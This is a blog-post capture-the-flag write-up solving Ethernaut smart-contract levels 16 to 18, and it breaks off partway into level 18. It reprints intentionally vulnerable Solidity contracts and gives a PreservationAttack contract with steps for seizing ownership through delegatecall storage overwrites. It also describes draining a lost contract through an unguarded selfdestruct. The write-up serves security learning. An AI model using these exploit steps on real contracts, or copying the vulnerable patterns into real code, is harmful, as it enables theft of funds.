@@ -1,0 +1,900 @@
+
+<!DOCTYPE html>
+<html lang="en" data-figures="" class="page" data-mode="dim">
+  <head>
+<title>Solving Ethernaut - Part 4 - Levels 16 to 20 | tqts.ar</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-HFZFM2N29W"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-HFZFM2N29W');
+</script>
+
+<meta property="og:locale" content="en" />
+
+<meta property="og:type" content="article">
+<meta name="description" content="Fourth part of the solutions to Ethernaut. This time the challenges get harder and more interesting.">
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:creator" content="">
+<meta name="twitter:title" content="Solving Ethernaut - Part 4 - Levels 16 to 20" />
+<meta property="og:url" content="https://tqts.ar/post/ethernaut-4/" />
+<meta property="og:title" content="Solving Ethernaut - Part 4 - Levels 16 to 20" />
+<meta property="og:description" content="Fourth part of the solutions to Ethernaut. This time the challenges get harder and more interesting." />
+<meta property="og:image" content="https://tqts.ar/images/thumbnail.png" />
+
+<link rel="apple-touch-icon" sizes="180x180" href="https://tqts.ar/icons/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://tqts.ar/icons/favicon-32x32.png">
+<link rel="manifest" href="https://tqts.ar/icons/site.webmanifest">
+
+<link rel="canonical" href="https://tqts.ar/post/ethernaut-4/">
+
+    
+
+    
+    
+    <link rel="preload" href="https://tqts.ar/css/styles.75d793ff9f1e090e07d6a6cf44af247593771bca925b6dc314709dc3c182c3174fd9691c42ea2128f9e95746557fc6918b2f7990cfcf6d34c56a7806d9b6a2da.css" integrity = "sha512-ddeT/58eCQ4H1qbPRK8kdZN3G8qSW23DFHCdw8GCwxdP2WkcQuohKPnpV0ZVf8aRiy95kM/PbTTFangG2bai2g==" as="style" crossorigin="anonymous">
+    <link rel="preload" href="https://tqts.ar/js/bundle.min.061d04727b51b0a8fafe2f15b9370a961f33306e7af52abd00d69c906f5d825f1599306159d7756d7d2b4f359767a170625ae541d1f37d05c1daa4d5c7feec25.js" as="script" integrity=
+    "sha512-Bh0EcntRsKj6/i8VuTcKlh8zMG569Sq9ANackG9dgl8VmTBhWdd1bX0rTzWXZ6FwYlrlQdHzfQXB2qTVx/7sJQ==" crossorigin="anonymous">
+
+    
+    <link rel="stylesheet" type="text/css" href="https://tqts.ar/css/styles.75d793ff9f1e090e07d6a6cf44af247593771bca925b6dc314709dc3c182c3174fd9691c42ea2128f9e95746557fc6918b2f7990cfcf6d34c56a7806d9b6a2da.css" integrity="sha512-ddeT/58eCQ4H1qbPRK8kdZN3G8qSW23DFHCdw8GCwxdP2WkcQuohKPnpV0ZVf8aRiy95kM/PbTTFangG2bai2g==" crossorigin="anonymous">
+    
+  </head>
+  
+  
+  
+    
+  
+  <body data-code="25" data-lines="true" id="documentTop">
+
+
+<header class="nav_header" >
+  <nav class="nav"><a href='https://tqts.ar/' class="nav_brand nav_item" title="tqts.ar">
+  <img src="https://tqts.ar/logos/logo.png" class="logo" alt="tqts.ar">
+  <div class="nav_close">
+    <div><svg class="icon">
+  <use xlink:href="#open-menu"></use>
+</svg><svg class="icon">
+  <use xlink:href="#closeme"></use>
+</svg></div>
+  </div>
+</a>
+
+    <div class='nav_body nav_body_left'>
+      
+      
+      
+        
+
+  <div class="nav_parent">
+    <a href="https://tqts.ar/" class="nav_item" title="Home">Home </a>
+  </div>
+  <div class="nav_parent">
+    <a href="https://tqts.ar/posts/" class="nav_item" title="Archives">Archives </a>
+  </div>
+  <div class="nav_parent">
+    <a href="https://tqts.ar/about/" class="nav_item" title="About">About </a>
+  </div>
+      
+<div class='follow'>
+  <a href="https://github.com/tqtsar">
+    <svg class="icon">
+  <use xlink:href="#github"></use>
+</svg>
+  </a>
+    
+  <a href="https://tqts.ar/index.xml">
+    <svg class="icon">
+  <use xlink:href="#rss"></use>
+</svg>
+  </a>
+<div class="color_mode">
+  <input type="checkbox" class="color_choice" id="mode">
+</div>
+
+</div>
+
+    </div>
+  </nav>
+</header>
+
+    <main>
+  
+<div class="grid-inverse wrap content">
+  <article class="post_content">
+    <h1 class="post_title">Solving Ethernaut - Part 4 - Levels 16 to 20</h1>
+  <div class="post_meta">
+    <span><svg class="icon">
+  <use xlink:href="#calendar"></use>
+</svg></span>
+    <span class="post_date">
+      Nov 15, 2021</span>
+    <span class="post_time"> · 15 min read</span><span>&nbsp;· <a href='https://tqts.ar/tags/remix' title="Remix" class="post_tag button button_translucent">Remix
+        </a><a href='https://tqts.ar/tags/solidity' title="Solidity" class="post_tag button button_translucent">Solidity
+        </a>
+    </span>
+    <span class="page_only">&nbsp;·
+  <div class="post_share">
+    Share on:
+    <a href="https://twitter.com/intent/tweet?text=Solving%20Ethernaut%20-%20Part%204%20-%20Levels%2016%20to%2020&url=https%3a%2f%2ftqts.ar%2fpost%2fethernaut-4%2f&tw_p=tweetbutton" class="twitter" title="Share on Twitter" target="_blank" rel="nofollow">
+      <svg class="icon">
+  <use xlink:href="#twitter"></use>
+</svg>
+    </a>
+    <a href="https://www.facebook.com/sharer.php?u=https%3a%2f%2ftqts.ar%2fpost%2fethernaut-4%2f&t=Solving%20Ethernaut%20-%20Part%204%20-%20Levels%2016%20to%2020" class="facebook" title="Share on Facebook" target="_blank" rel="nofollow">
+      <svg class="icon">
+  <use xlink:href="#facebook"></use>
+</svg>
+    </a>
+    <a href="#linkedinshare" id = "linkedinshare" class="linkedin" title="Share on LinkedIn" rel="nofollow">
+      <svg class="icon">
+  <use xlink:href="#linkedin"></use>
+</svg>
+    </a>
+    <a href="https://tqts.ar/post/ethernaut-4/" title="Copy Link" class="link link_yank">
+      <svg class="icon">
+  <use xlink:href="#copy"></use>
+</svg>
+    </a>
+  </div>
+  </span>
+  </div>
+
+
+
+
+    
+    <div class="post_toc">
+      <h2>Overview</h2>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#level-16-preservation">Level 16: Preservation</a>
+      <ul>
+        <li><a href="#contract-analysis">Contract analysis</a></li>
+        <li><a href="#vulnerability--attack-vector">Vulnerability / Attack vector</a></li>
+        <li><a href="#solution">Solution</a></li>
+        <li><a href="#conclusions">Conclusions</a></li>
+      </ul>
+    </li>
+    <li><a href="#level-17-recovery">Level 17: Recovery</a>
+      <ul>
+        <li><a href="#contract-analysis-1">Contract analysis</a></li>
+        <li><a href="#vulnerability--attack-vector-1">Vulnerability / Attack vector</a></li>
+        <li><a href="#solution-1">Solution</a></li>
+        <li><a href="#conclusions-1">Conclusions</a></li>
+      </ul>
+    </li>
+    <li><a href="#level-18-magicnumber">Level 18: MagicNumber</a>
+      <ul>
+        <li><a href="#contract-analysis-2">Contract analysis</a></li>
+        <li><a href="#vulnerability--attack-vector-2">Vulnerability / Attack vector</a></li>
+        <li><a href="#solution-2">Solution</a></li>
+        <li><a href="#conclusions-2">Conclusions</a></li>
+      </ul>
+    </li>
+    <li><a href="#level-19-alien-codex">Level 19: Alien Codex</a>
+      <ul>
+        <li><a href="#contract-analysis-3">Contract analysis</a></li>
+        <li><a href="#vulnerability--attack-vector-3">Vulnerability / Attack vector</a></li>
+        <li><a href="#solution-3">Solution</a></li>
+        <li><a href="#conclusions-3">Conclusions</a></li>
+      </ul>
+    </li>
+    <li><a href="#level-20-denial">Level 20: Denial</a>
+      <ul>
+        <li><a href="#contract-analysis-4">Contract analysis</a></li>
+        <li><a href="#vulnerability--attack-vector-4">Vulnerability / Attack vector</a></li>
+        <li><a href="#solution-4">Solution</a></li>
+        <li><a href="#conclusions-4">Conclusions</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+    
+    <div class="post_body"><p>Fourth part of the solutions to Ethernaut. This time the challenges get harder and more interesting.</p>
+<style type="text/css">.notice{padding:18px;line-height:24px;margin-bottom:24px;border-radius:4px;color:#444;background:#e7f2fa}.notice p:last-child{margin-bottom:0}.notice-title{margin:-18px -18px 12px;padding:4px 18px;border-radius:4px 4px 0 0;font-weight:700;color:#fff;background:#6ab0de}.notice.warning .notice-title{background:rgba(217,83,79,.9)}.notice.warning{background:#fae2e2}.notice.info .notice-title{background:#f0b37e}.notice.info{background:#fff2db}.notice.note .notice-title{background:#6ab0de}.notice.note{background:#e7f2fA}.notice.tip .notice-title{background:rgba(92,184,92,.8)}.notice.tip{background:#e6f9e6}.icon-notice{display:inline-flex;align-self:center;margin-right:8px}.icon-notice img,.icon-notice svg{height:1em;width:1em;fill:currentColor}.icon-notice img,.icon-notice.baseline svg{top:0.125em;position:relative}</style>
+<div><svg width="0" height="0" display="none" xmlns="http://www.w3.org/2000/svg"><symbol id="tip-notice" viewBox="0 0 512 512" preserveAspectRatio="xMidYMid meet"><path d="M504 256c0 136.967-111.033 248-248 248S8 392.967 8 256 119.033 8 256 8s248 111.033 248 248zM227.314 387.314l184-184c6.248-6.248 6.248-16.379 0-22.627l-22.627-22.627c-6.248-6.249-16.379-6.249-22.628 0L216 308.118l-70.059-70.059c-6.248-6.248-16.379-6.248-22.628 0l-22.627 22.627c-6.248 6.248-6.248 16.379 0 22.627l104 104c6.249 6.249 16.379 6.249 22.628.001z"/></symbol><symbol id="note-notice" viewBox="0 0 512 512" preserveAspectRatio="xMidYMid meet"><path d="M504 256c0 136.997-111.043 248-248 248S8 392.997 8 256C8 119.083 119.043 8 256 8s248 111.083 248 248zm-248 50c-25.405 0-46 20.595-46 46s20.595 46 46 46 46-20.595 46-46-20.595-46-46-46zm-43.673-165.346l7.418 136c.347 6.364 5.609 11.346 11.982 11.346h48.546c6.373 0 11.635-4.982 11.982-11.346l7.418-136c.375-6.874-5.098-12.654-11.982-12.654h-63.383c-6.884 0-12.356 5.78-11.981 12.654z"/></symbol><symbol id="warning-notice" viewBox="0 0 576 512" preserveAspectRatio="xMidYMid meet"><path d="M569.517 440.013C587.975 472.007 564.806 512 527.94 512H48.054c-36.937 0-59.999-40.055-41.577-71.987L246.423 23.985c18.467-32.009 64.72-31.951 83.154 0l239.94 416.028zM288 354c-25.405 0-46 20.595-46 46s20.595 46 46 46 46-20.595 46-46-20.595-46-46-46zm-43.673-165.346l7.418 136c.347 6.364 5.609 11.346 11.982 11.346h48.546c6.373 0 11.635-4.982 11.982-11.346l7.418-136c.375-6.874-5.098-12.654-11.982-12.654h-63.383c-6.884 0-12.356 5.78-11.981 12.654z"/></symbol><symbol id="info-notice" viewBox="0 0 512 512" preserveAspectRatio="xMidYMid meet"><path d="M256 8C119.043 8 8 119.083 8 256c0 136.997 111.043 248 248 248s248-111.003 248-248C504 119.083 392.957 8 256 8zm0 110c23.196 0 42 18.804 42 42s-18.804 42-42 42-42-18.804-42-42 18.804-42 42-42zm56 254c0 6.627-5.373 12-12 12h-88c-6.627 0-12-5.373-12-12v-24c0-6.627 5.373-12 12-12h12v-64h-12c-6.627 0-12-5.373-12-12v-24c0-6.627 5.373-12 12-12h64c6.627 0 12 5.373 12 12v100h12c6.627 0 12 5.373 12 12v24z"/></symbol></svg></div><div class="notice info" >
+<p class="first notice-title"><span class="icon-notice baseline"><svg><use href="#info-notice"></use></svg></span>Info</p><p>All my solutions to Ethernaut were coded some time ago, however, I had a bit more experience with Solidity than when I solved CaptureTheEther. The code still won't win any style or correctness competition, but does its job.</p>
+<p>It's possible to see an improvement on the quality of my code. The contracts I used were not modified nor prettified for publishing, so I'm quite proud of my progress. Still there's a lot of room for even more improvements. Never stop learning and getting better at something.</p>
+<p>The complete code for these solutions is at my <a href="https://github.com/tqtsar/ethernaut-solutions">Ethernaut-solutions github repo</a>.</p></div>
+
+<hr>
+<h2 id="level-16-preservation">Level 16: Preservation</h2>
+<hr>
+<p>A contract that relies on two libraries to keep track of time in two different timezones. The goal is to become the owner of the contract.</p>
+<h3 id="contract-analysis">Contract analysis</h3>
+<p>The <code>Preservation</code> contract implements two functions to set the time for each one of the libraries. <code>setFirstTime(uint)</code> and <code>setSecondTime(uint)</code> are almost identical, they make a <code>delegatecall</code> to each library that calls the <code>setTime(uint256)</code> function of the target contract.</p>
+<p>There are four storage slots used:</p>
+<ul>
+<li>Slot 0: <code>address timeZone1Library</code></li>
+<li>Slot 1: <code>address timeZone2Library</code></li>
+<li>Slot 2: <code>address owner</code></li>
+<li>Slot 3: <code>uint storedTime</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span><span class="c1">// SPDX-License-Identifier: MIT
+</span><span class="ln"> 2</span><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="ln"> 3</span>
+<span class="ln"> 4</span><span class="kd">contract</span> <span class="nc">Preservation</span> <span class="p">{</span>
+<span class="ln"> 5</span>
+<span class="ln"> 6</span>  <span class="c1">// public library contracts 
+</span><span class="ln"> 7</span><span class="c1"></span>  <span class="kt">address</span> <span class="k">public</span> <span class="n">timeZone1Library</span><span class="p">;</span>
+<span class="ln"> 8</span>  <span class="kt">address</span> <span class="k">public</span> <span class="n">timeZone2Library</span><span class="p">;</span>
+<span class="ln"> 9</span>  <span class="kt">address</span> <span class="k">public</span> <span class="n">owner</span><span class="p">;</span> 
+<span class="ln">10</span>  <span class="kt">uint</span> <span class="n">storedTime</span><span class="p">;</span>
+<span class="ln">11</span>  <span class="c1">// Sets the function signature for delegatecall
+</span><span class="ln">12</span><span class="c1"></span>  <span class="kt">bytes4</span> <span class="k">constant</span> <span class="n">setTimeSignature</span> <span class="o">=</span> <span class="kt">bytes4</span><span class="p">(</span><span class="nb">keccak256</span><span class="p">(</span><span class="s">&#34;setTime(uint256)&#34;</span><span class="p">));</span>
+<span class="ln">13</span>
+<span class="ln">14</span>  <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_timeZone1LibraryAddress</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_timeZone2LibraryAddress</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+<span class="ln">15</span>    <span class="n">timeZone1Library</span> <span class="o">=</span> <span class="n">_timeZone1LibraryAddress</span><span class="p">;</span> 
+<span class="ln">16</span>    <span class="n">timeZone2Library</span> <span class="o">=</span> <span class="n">_timeZone2LibraryAddress</span><span class="p">;</span> 
+<span class="ln">17</span>    <span class="n">owner</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
+<span class="ln">18</span>  <span class="p">}</span>
+<span class="ln">19</span> 
+<span class="ln">20</span>  <span class="c1">// set the time for timezone 1
+</span><span class="ln">21</span><span class="c1"></span>  <span class="kd">function</span> <span class="nf">setFirstTime</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_timeStamp</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+<span class="ln">22</span>    <span class="n">timeZone1Library</span><span class="p">.</span><span class="nb">delegatecall</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span><span class="n">setTimeSignature</span><span class="p">,</span> <span class="n">_timeStamp</span><span class="p">));</span>
+<span class="ln">23</span>  <span class="p">}</span>
+<span class="ln">24</span>
+<span class="ln">25</span>  <span class="c1">// set the time for timezone 2
+</span><span class="ln">26</span><span class="c1"></span>  <span class="kd">function</span> <span class="nf">setSecondTime</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_timeStamp</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+<span class="ln">27</span>    <span class="n">timeZone2Library</span><span class="p">.</span><span class="nb">delegatecall</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span><span class="n">setTimeSignature</span><span class="p">,</span> <span class="n">_timeStamp</span><span class="p">));</span>
+<span class="ln">28</span>  <span class="p">}</span>
+<span class="ln">29</span><span class="p">}</span>
+<span class="ln">30</span>
+<span class="ln">31</span><span class="c1">// Simple library contract to set the time
+</span><span class="ln">32</span><span class="c1"></span><span class="kd">contract</span> <span class="nc">LibraryContract</span> <span class="p">{</span>
+<span class="ln">33</span>
+<span class="ln">34</span>  <span class="c1">// stores a timestamp 
+</span><span class="ln">35</span><span class="c1"></span>  <span class="kt">uint</span> <span class="n">storedTime</span><span class="p">;</span>  
+<span class="ln">36</span>
+<span class="ln">37</span>  <span class="kd">function</span> <span class="nf">setTime</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_time</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+<span class="ln">38</span>    <span class="n">storedTime</span> <span class="o">=</span> <span class="n">_time</span><span class="p">;</span>
+<span class="ln">39</span>  <span class="p">}</span>
+<span class="ln">40</span><span class="p">}</span>
+</code></pre></div><p>The <code>LibraryContract</code> implements the <code>setTime(uint)</code> function that will be called by the <code>setXxxTime(uint)</code> functions of the <code>Preservation</code> contract.</p>
+<h3 id="vulnerability--attack-vector">Vulnerability / Attack vector</h3>
+<p>The use of <code>delegatecall</code> on an untrusted address can have terrible consequences. Remember that <code>delegatecall</code> executes code of another contract in the current contract context. <a href="../ethernaut-2/#level-6-delegation">Level 06 - Delegation</a> was a simpler challenge with a similar exploit.</p>
+<h3 id="solution">Solution</h3>
+<p>Since the libraries are delegated, the context is preserved and so they can modify the caller's storage. The goal is to modify the <code>owner</code> variable in storage slot 2, and set it to the player's address.</p>
+<p>The solution comes in three stages:</p>
+<ul>
+<li>Create a contract that implements a <code>setTime(uint)</code> function, with the code needed to modify storage slot 2.</li>
+<li>Modify <code>timeZone1Library</code> address by calling <code>setSecondTime(uint)</code>, and set it to the contract deployed in the previous stage</li>
+<li>Call <code>setFirstTime(uint)</code> to overwrite the <code>owner</code> variable</li>
+</ul>
+<p>For the first step, the attacker contract used was the following:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span><span class="kd">contract</span> <span class="nc">PreservationAttack</span> <span class="p">{</span>
+<span class="ln"> 2</span>
+<span class="ln"> 3</span>  <span class="kt">uint</span> <span class="n">storedTime</span><span class="p">;</span>  
+<span class="ln"> 4</span>  <span class="kt">uint</span> <span class="n">not_important</span><span class="p">;</span>
+<span class="ln"> 5</span>  <span class="kt">address</span> <span class="n">owner</span><span class="p">;</span>
+<span class="ln"> 6</span>
+<span class="ln"> 7</span>  <span class="kd">function</span> <span class="nf">setTime</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_time</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+<span class="ln"> 8</span>    <span class="n">storedTime</span> <span class="o">=</span> <span class="n">_time</span><span class="p">;</span>
+<span class="ln"> 9</span>    <span class="n">owner</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
+<span class="ln">10</span>  <span class="p">}</span>
+<span class="ln">11</span><span class="p">}</span>
+</code></pre></div><p>It creates enough dummy variables to be able to overwrite storage slot 2. As a bonus, it implements the <em>expected</em> behavior of the library.</p>
+<p>Next step, call <code>setSecondTime(uint)</code> with the address of the deployed attacker as argument. This will effectively overwrite storage slot 0 of the <code>Preservation</code> instance, and allow the player to call the attacker in the next stage.</p>
+<p>Finally, call <code>setFirstTime(uint)</code>. The argument is not really important, but whatever is sent will be set as the <code>address timeZone1Library</code>.</p>
+<h3 id="conclusions">Conclusions</h3>
+<p>This level was a review of the delegated calls, caller contexts and storage. An interesting fact of the level is the way that the <code>delegatecall</code> is made, by crafting the function signature in the same contract (specifically in line 12 of the <code>Preservation</code> contract listing).</p>
+<hr>
+<h2 id="level-17-recovery">Level 17: Recovery</h2>
+<hr>
+<p>A simple token factory. The problem is that the deployed contract address was lost, so apparently there is no way to recover the lost half ether. The goal is to recover the 0.5 ethers, or remove them from the contract somehow.</p>
+<h3 id="contract-analysis-1">Contract analysis</h3>
+<p>The interesting part of the contract, and the one that is needed to solve the level is the <code>destroy(address)</code> function. It calls <code>selfdestruct</code> with the supplied argument, so it can transfer the contract balance to a user-supplied address.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span><span class="c1">// SPDX-License-Identifier: MIT
+</span><span class="ln"> 2</span><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="ln"> 3</span>
+<span class="ln"> 4</span><span class="kn">import</span> <span class="s">&#39;@openzeppelin/contracts/math/SafeMath.sol&#39;</span><span class="p">;</span>
+<span class="ln"> 5</span>
+<span class="ln"> 6</span><span class="kd">contract</span> <span class="nc">Recovery</span> <span class="p">{</span>
+<span class="ln"> 7</span>
+<span class="ln"> 8</span>  <span class="c1">//generate tokens
+</span><span class="ln"> 9</span><span class="c1"></span>  <span class="kd">function</span> <span class="nf">generateToken</span><span class="p">(</span><span class="kt">string</span> <span class="k">memory</span> <span class="n">_name</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_initialSupply</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+<span class="ln">10</span>    <span class="k">new</span> <span class="n">SimpleToken</span><span class="p">(</span><span class="n">_name</span><span class="p">,</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">_initialSupply</span><span class="p">);</span>
+<span class="ln">11</span>  
+<span class="ln">12</span>  <span class="p">}</span>
+<span class="ln">13</span><span class="p">}</span>
+<span class="ln">14</span>
+<span class="ln">15</span><span class="kd">contract</span> <span class="nc">SimpleToken</span> <span class="p">{</span>
+<span class="ln">16</span>
+<span class="ln">17</span>  <span class="kn">using</span> <span class="n">SafeMath</span> <span class="k">for</span> <span class="kt">uint256</span><span class="p">;</span>
+<span class="ln">18</span>  <span class="c1">// public variables
+</span><span class="ln">19</span><span class="c1"></span>  <span class="kt">string</span> <span class="k">public</span> <span class="nb">name</span><span class="p">;</span>
+<span class="ln">20</span>  <span class="kd">mapping</span> <span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint</span><span class="p">)</span> <span class="k">public</span> <span class="n">balances</span><span class="p">;</span>
+<span class="ln">21</span>
+<span class="ln">22</span>  <span class="c1">// constructor
+</span><span class="ln">23</span><span class="c1"></span>  <span class="kd">constructor</span><span class="p">(</span><span class="kt">string</span> <span class="k">memory</span> <span class="n">_name</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_creator</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_initialSupply</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+<span class="ln">24</span>    <span class="nb">name</span> <span class="o">=</span> <span class="n">_name</span><span class="p">;</span>
+<span class="ln">25</span>    <span class="n">balances</span><span class="p">[</span><span class="n">_creator</span><span class="p">]</span> <span class="o">=</span> <span class="n">_initialSupply</span><span class="p">;</span>
+<span class="ln">26</span>  <span class="p">}</span>
+<span class="ln">27</span>
+<span class="ln">28</span>  <span class="c1">// collect ether in return for tokens
+</span><span class="ln">29</span><span class="c1"></span>  <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+<span class="ln">30</span>    <span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">.</span><span class="n">mul</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
+<span class="ln">31</span>  <span class="p">}</span>
+<span class="ln">32</span>
+<span class="ln">33</span>  <span class="c1">// allow transfers of tokens
+</span><span class="ln">34</span><span class="c1"></span>  <span class="kd">function</span> <span class="nf">transfer</span><span class="p">(</span><span class="kt">address</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span> 
+<span class="ln">35</span>    <span class="nb">require</span><span class="p">(</span><span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="n">_amount</span><span class="p">);</span>
+<span class="ln">36</span>    <span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">=</span> <span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">].</span><span class="n">sub</span><span class="p">(</span><span class="n">_amount</span><span class="p">);</span>
+<span class="ln">37</span>    <span class="n">balances</span><span class="p">[</span><span class="n">_to</span><span class="p">]</span> <span class="o">=</span> <span class="n">_amount</span><span class="p">;</span>
+<span class="ln">38</span>  <span class="p">}</span>
+<span class="ln">39</span>
+<span class="ln">40</span>  <span class="c1">// clean up after ourselves
+</span><span class="ln">41</span><span class="c1"></span>  <span class="kd">function</span> <span class="nf">destroy</span><span class="p">(</span><span class="kt">address</span> <span class="k">payable</span> <span class="n">_to</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+<span class="ln">42</span>    <span class="nb">selfdestruct</span><span class="p">(</span><span class="n">_to</span><span class="p">);</span>
+<span class="ln">43</span>  <span class="p">}</span>
+<span class="ln">44</span><span class="p">}</span>
+</code></pre></div><h3 id="vulnerability--attack-vector-1">Vulnerability / Attack vector</h3>
+<p>Not a vulnerability. The goal is to find the contract address, that is <em>hidden</em> somewhere in the blockchain. <em>&quot;Hidden&quot;</em>.</p>
+<h3 id="solution-1">Solution</h3>
+<p>The contract deployment receipt shows two interactions with other contracts, as shown in the image below:</p>
+<p>
+
+
+
+
+
+
+
+
+
+  <figure>
+    <picture>
+
+      
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+      
+
+      <img class="image_figure image_internal" src="https://tqts.ar/images/post-imgs/ethernaut-4-17.png" alt="Deployment receipt" loading="lazy" decoding="async" width="904" height="386"  />
+      
+
+    </picture>
+  </figure>
+</p>
+<p>The underlined address has the 0.5 ethers, so calling its <code>destroy(address)</code> function with the player's address as argument should get the funds back and solve the level.</p>
+<h3 id="conclusions-1">Conclusions</h3>
+<p>Another proof that there are no secrets on the blockchain. Everything is visible.</p>
+<hr>
+<h2 id="level-18-magicnumber">Level 18: MagicNumber</h2>
+<hr>
+<p>This level implements a new form of challenge. You should deploy a contract whose <code>whatIsTheMeaningOfLife()</code> function returns <code>0x42</code>, but with the caveat that the deployed code size must be less than or equal to 10 bytes. <em>Welcome to low level programming, enjoy your ride.</em></p>
+<h3 id="contract-analysis-2">Contract analysis</h3>
+<p>Nothing special, the <code>setSolver(address)</code> should be called to tell the contract where the solver is, and the Ethernaut logic will check if the conditions are met.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span><span class="c1">// SPDX-License-Identifier: MIT
+</span><span class="ln"> 2</span><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="ln"> 3</span>
+<span class="ln"> 4</span><span class="kd">contract</span> <span class="nc">MagicNum</span> <span class="p">{</span>
+<span class="ln"> 5</span>
+<span class="ln"> 6</span>  <span class="kt">address</span> <span class="k">public</span> <span class="n">solver</span><span class="p">;</span>
+<span class="ln"> 7</span>
+<span class="ln"> 8</span>  <span class="kd">constructor</span><span class="p">()</span> <span class="k">public</span> <span class="p">{}</span>
+<span class="ln"> 9</span>
+<span class="ln">10</span>  <span class="kd">function</span> <span class="nf">setSolver</span><span class="p">(</span><span class="kt">address</span> <span class="n">_solver</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+<span class="ln">11</span>    <span class="n">solver</span> <span class="o">=</span> <span class="n">_solver</span><span class="p">;</span>
+<span class="ln">12</span>  <span class="p">}</span>
+<span class="ln">13</span>
+<span class="ln">14</span>  <span class="cm">/*
+</span><span class="ln">15</span><span class="cm">    ____________/\\\_______/\\\\\\\\\_____        
+</span><span class="ln">16</span><span class="cm">     __________/\\\\\_____/\\\///////\\\___       
+</span><span class="ln">17</span><span class="cm">      ________/\\\/\\\____\///______\//\\\__      
+</span><span class="ln">18</span><span class="cm">       ______/\\\/\/\\\______________/\\\/___     
+</span><span class="ln">19</span><span class="cm">        ____/\\\/__\/\\\___________/\\\//_____    
+</span><span class="ln">20</span><span class="cm">         __/\\\\\\\\\\\\\\\\_____/\\\//________   
+</span><span class="ln">21</span><span class="cm">          _\///////////\\\//____/\\\/___________  
+</span><span class="ln">22</span><span class="cm">           ___________\/\\\_____/\\\\\\\\\\\\\\\_ 
+</span><span class="ln">23</span><span class="cm">            ___________\///_____\///////////////__
+</span><span class="ln">24</span><span class="cm">  */</span>
+<span class="ln">25</span><span class="p">}</span>
+</code></pre></div><h3 id="vulnerability--attack-vector-2">Vulnerability / Attack vector</h3>
+<p>None. Not a vulnerability, just another concept-teaching level.</p>
+<h3 id="solution-2">Solution</h3>
+<p>This will be a rather long explanation, because it involves some interesting concepts and learning paths.</p>
+<p>The first approach was to deploy a contract that implements the required logic, but obviously, without the size limitation. The goal is to create a function that returns <code>42</code> (or <code>0x2A</code> in hex) in Remix, and iterate from there. The shortest contract I came up with was the following:</p>
